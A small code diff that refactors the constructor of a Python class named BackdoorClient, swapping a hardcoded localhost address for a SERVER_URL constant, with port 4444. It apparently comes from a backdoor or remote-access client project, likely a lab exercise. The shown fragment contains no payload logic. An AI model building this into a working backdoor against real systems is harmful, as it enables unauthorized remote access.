@@ -7,7 +7,7 @@ SERVER_URL = "127.0.0.1"
 PORT = 4444
 
 class BackdoorClient:
-    def __init__(self, host='127.0.0.1', port=PORT):
+    def __init__(self, host=SERVER_URL, port=PORT):
         self.host = host
         self.port = port
         self.buffer_size = 4096
